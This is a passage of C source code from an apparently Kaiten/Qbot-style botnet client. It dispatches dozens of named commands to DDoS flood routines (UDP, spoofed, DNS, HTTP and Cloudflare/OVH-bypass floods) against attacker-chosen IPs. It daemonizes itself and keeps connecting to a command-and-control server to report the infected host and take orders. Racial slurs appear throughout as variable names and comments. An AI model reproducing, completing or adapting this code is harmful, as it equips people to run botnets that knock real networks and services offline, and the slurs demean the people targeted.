        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }  

    if(!strcmp(argv[0], "RIP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "SMASH"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "UBNT"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "DVR"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "BEAMED"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }

    if(!strcmp(argv[0], "STUN-X"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendNUKE(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendNUKE(ip, port, time);
            _exit(0);
        }
    }

        if(!strcmp(argv[0], "LIZARDS"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendLIZARDS(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendLIZARDS(ip, port, time);
            _exit(0);
        }
    }   ///

    if(!strcmp(argv[0], "DNS"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendDNS(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendDNS(ip, port, time);
            _exit(0);
        }
    }   ////
    if(!strcmp(argv[0], "HTTPS"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendHTTPS(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendHTTPS(ip, port, time);
            _exit(0);
        }
    }   ////
    if(!strcmp(argv[0], "BLAZINGFAST"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendBLAZINGFAST(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendBLAZINGFAST(ip, port, time);
            _exit(0);
        }
    }   ////
    if(!strcmp(argv[0], "WIX"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendWIX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendWIX(ip, port, time);
            _exit(0);
        }
    }   ////



        if (!strcmp(argv[0], "KILL-OVH"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        SendKILLOVH(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca


    if (!strcmp(argv[0], "SLAP-OVH"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        SendKILLOVH(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if(!strcmp(argv[0], "OVH-UDP"))
  {
    if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1)
    {
      return;
    }
    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int packetsize = atoi(argv[4]);
    if(strstr(ip, ",") != NULL)
    {
      unsigned char *hi = strtok(ip, ",");
      while(hi != NULL)
      {
        if(!listFork())
        {
          astd(hi, port, time, packetsize);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) { return; }
      astd(ip, port, time, packetsize);
      _exit(0);
    }
    }

    if (!strcmp(argv[0], "NFO-FUCK"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "HYDRA-B"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "VPN-NULL"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "NUM-B"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "AP-O"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "WSD"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "REDSYN"))
    {
      if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
      if (listFork()) return;
      SendHTTPHex(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      exit(0);
    }

    if (!strcmp(argv[0], "HXTP"))
    {
      if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
      if (listFork()) return;
      SendHTTPHex(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      exit(0);
    }

    if (!strcmp(argv[0], "KILLALL"))
    {
      if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
      if (listFork()) return;
      SendHTTPHex(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      sendHTTPtwo(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
      exit(0);
    }

if (!strcmp(argv[0], "KILLALLV2"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if(!strcmp(argv[0], "SERVER-1"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                       
                        return;
                }
 
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
 
                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        SendSTDHEX(ip, port, time);
                                        SendVPS(ip, port, time);
                                        Randhex(ip, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
 
                                        SendSTDHEX(ip, port, time);
                                        SendVPS(ip, port, time);
                                        Randhex(ip, port, time);
                        _exit(0);
                }
        }


        else if(!strcmp(argv[0], "CPU"))//unpatchable!!
        {
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        Randhex(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        Randhex(ip, port, time);
                        _exit(0);
                   }
        }


            if(!strcmp(argv[0], "FN")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

            if(!strcmp(argv[0], "ARK")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

            if(!strcmp(argv[0], "COD")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

            if(!strcmp(argv[0], "GTA")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

            if(!strcmp(argv[0], "RBX")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

            if(!strcmp(argv[0], "MC")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }

 if(!strcmp(argv[0], "R6"))
    {
      if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
      {
        return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
        int spoofed = 32;
                if(strstr(ip, ",") != NULL)
        {
          unsigned char *hi = strtok(ip, ",");
          while(hi != NULL)
          {
            if(!listFork())
            {
              SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
              _exit(0);
            }
            hi = strtok(NULL, ",");
          }
                } else {
              if (listFork())
              {
                return;
              }
              SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
              _exit(0);
             }  
        }



if(!strcmp(argv[0], "WGET"))
      {
    if(argc < 3 || atoi(argv[2]) < 1)
    {
      return;
    }

    unsigned char *ip = argv[1];
    int time = atoi(argv[2]);

    if(strstr(ip, ",") != NULL)
    {
      unsigned char *hi = strtok(ip, ",");
      while(hi != NULL)
      {
        if(!listFork())
        {
          int i = 0;
          while(i < 10){
            SendWGET(ip, time);
            i++;
          }
          close(mainCommSock);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) { return; }
      int i = 0;
      while(i < 10){
        SendWGET(ip, time);
        i++;
      }
      close(mainCommSock);

      _exit(0);
    }
  }

  if (!strcmp(argv[0], "CFKILL"))
  {
    if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
    if (listFork()) return;
    SendCloudflare(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
    exit(0);
  }

  if (!strcmp(argv[0], "NULL-CF"))
    {
      if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
            if (listFork()) return;
            SendHTTPCloudflare(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            exit(0);
    }

              if(!strcmp(argv[0], "COMBO"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                       
                        return;
                }
 
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
 
                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        ajunk(ip, port, time);
                                        ahold(ip, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
 
                        ajunk(ip, port, time);
                        ahold(ip, port, time);
                        _exit(0);
                }
        }

        if(!strcmp(argv[0], "HOME"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                       
                        return;
                }
 
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
 
                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        SendSTDHEX(ip, port, time);
                                        SendVPS(ip, port, time);
                                        VixSTD(ip, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
 
                        SendSTDHEX(ip, port, time);
                        SendVPS(ip, port, time);
                        VixSTD(ip, port, time);
                        _exit(0);
                }
        }





                if(!strcmp(argv[0], "JUNK"))
    {
      if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
      {
        //sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
        return;
      }

      unsigned char *ip = argv[1];
      int port = atoi(argv[2]);
      int time = atoi(argv[3]);

      if(strstr(ip, ",") != NULL)
      {
        unsigned char *ip = strtok(ip, ",");
        while(ip != NULL)
        {
          if(!listFork())
          {
            ajunk(ip, port, time);
            close(mainCommSock);
            _exit(0);
          }
          ip = strtok(NULL, ",");
        }
      } else {
        if (listFork()) { return; }

        ajunk(ip, port, time);
        close(mainCommSock);

        _exit(0);
      }
    }

             if(!strcmp(argv[0], "CNC"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        acnc(ip, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        acnc(ip, port, time);
                        _exit(0);
                }
        }

        if(!strcmp(argv[0], "DOMINATE"))
  {
    if(argc < 5 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) < 1)
    {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int pollinterval = argc == 8 ? atoi(argv[4]) : 10;

    if(strstr(ip, ",") != NULL)
    {
      sockprintf(mainCommSock, "DOMINATE Flooding %s for %d seconds.", ip, time);
      unsigned char *hi = strtok(ip, ",");
      while(hi != NULL)
      {
        if(!listFork())
        {
          SendDOMINATE(hi, port, time, pollinterval);
          close(mainCommSock);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) { return; }

      sockprintf(mainCommSock, "DOMINATE Flooding %s for %d seconds.", ip, time);
      SendDOMINATE(ip, port, time, pollinterval);
      close(mainCommSock);

      _exit(0);
    }
  }



  if(!strcmp(argv[0], "VPS"))
  {
    if(argc < 5 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) < 1)
    {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int pollinterval = argc == 8 ? atoi(argv[4]) : 10;

    if(strstr(ip, ",") != NULL)
    {
      sockprintf(mainCommSock, "VPS Flooding %s for %d seconds.", ip, time);
      unsigned char *hi = strtok(ip, ",");
      while(hi != NULL)
      {
        if(!listFork())
        {
          SendDOMINATE(hi, port, time, pollinterval);
          close(mainCommSock);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) { return; }

      sockprintf(mainCommSock, "VPS Flooding %s for %d seconds.", ip, time);
      SendDOMINATE(ip, port, time, pollinterval);
      close(mainCommSock);

      _exit(0);
    }
  }

                  if(!strcmp(argv[0], "ZTF-HOME"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    VixSTD(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            VixSTD(ip, port, time);
            _exit(0);
        }
    }
  

        if(!strcmp(argv[0], "STOP"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }

                if(killed > 0)
                {
                } else {
                }
        }
}

int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, commServer[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(mainCommSock, "\e[0m[\e[1;36mKaiten.\e[0m][\e[1;35m%s\e[0m]\e[1;35m:\e[0m[\e[1;35m%s\e[0m] \e[1;35m>\e[0m [\e[1;35m%s\e[0m]", inet_ntoa(ourIP), getPortz(), getArch());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);
                        
                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");/*
